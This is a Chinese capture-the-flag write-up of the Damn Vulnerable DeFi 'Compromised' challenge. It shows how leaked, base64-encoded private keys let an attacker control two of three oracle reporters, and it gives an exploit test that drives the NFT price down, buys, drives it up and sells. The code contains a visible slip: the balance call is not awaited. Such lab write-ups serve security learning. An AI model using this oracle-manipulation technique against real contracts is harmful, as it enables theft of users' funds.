# Damn Defi靶场刷题记录(7)

    author: Thomas_Xu

## 7 Compromised
之所以单独把这个题拉出来做一个wp是因为这个题太特殊了，也因为8，9是一套题目。
这个题设置的背景就很奇怪，它给了我们一个服务器的响应片段，而这些片段是由两大串十六进制数组成的。
而我们目前并不知道这串十六进制数意味着什么，那么先来看看代码吧。
> 通过粗略阅读后我们可以发现，这其实就是三个所谓的“可信报告者”所组成的一个预言机系统，最终的定价会以三个人的中位数为准，那么也就意味着我们只要控制两个人的行为，就可以操控价格。（想一想之前给的两串十六进制数，是不是能想到点什么呢？）

再来看合约
* **TrustfulOracleInitializer**
这只是一个TrustfulOracle的初始化合约，没有什么内容
* **TrustfulOracle**
这个预言机值得我们仔细阅读，首先，这个合约拓展了openzeppelin库的`AccessControlEnumerable.sol`，用来实现权限的管理，因为只有初始化的三个可信报告者可以定价。
这个预言机合约几乎提供了所有的可以修改价格的函数，报告者通过`postPrice()`来设定自己的价格，而`getMedianPrice()`是交易所来获取三个可信者定价中位数的函数，并以此来作为该交易的价格。

似乎没有一个有明显漏洞的地方可以利用，我们不得不重新回到原点重新思考，也许题目中给的两串十六进制数会有重大作用。
那我们就从这两串十六进制数入手，先把这十六进制数通过ascii码转换一下：
`MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5`
`MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4`
得到了两串“啥也不是”的字符串，但还不甘心，于是想这任然可能是编码后的结果，于是就拿到工具里一个一个解码尝试，最终发现base64解码出来后是一个类似于私钥的字符串
`0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9`
`0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48`
再次拿着字符串去做公钥的计算，发现竟然和题目中的两个可信报告者公钥一致！那么我们就等于是拿到了两个可信者的公钥，我们现在就是可信者！
那么到此，此题迎刃而解，我们通过获取机制中超过半数的控制权，获得了定价的权利。
* **Exploit**
由于我们获取了定价的权利，因此我们可以用几乎为0的价格买入NFT而以巨大的金额卖出它！
```
 it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        //用二者私钥创建钱包
        const sources1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
        const sources2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);

        //将NFT价格设置为1wei
        await this.oracle.connect(sources1).postPrice("DVNFT", 1);
        await this.oracle.connect(sources2).postPrice("DVNFT", 1);

        //买入
        await this.exchange.connect(attacker).buyOne({value:1});

        //重新将价格设置为exchange合约的总余额
        _balance =  ethers.provider.getBalance(this.exchange.address);
        await this.oracle.connect(sources1).postPrice("DVNFT", _balance);
        await this.oracle.connect(sources2).postPrice("DVNFT", _balance);

        //卖出
        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        await this.exchange.connect(attacker).sellOne(0);

        //重新把NFT价格复原
        await this.oracle.connect(sources1).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await this.oracle.connect(sources2).postPrice("DVNFT", INITIAL_NFT_PRICE);
    });
```
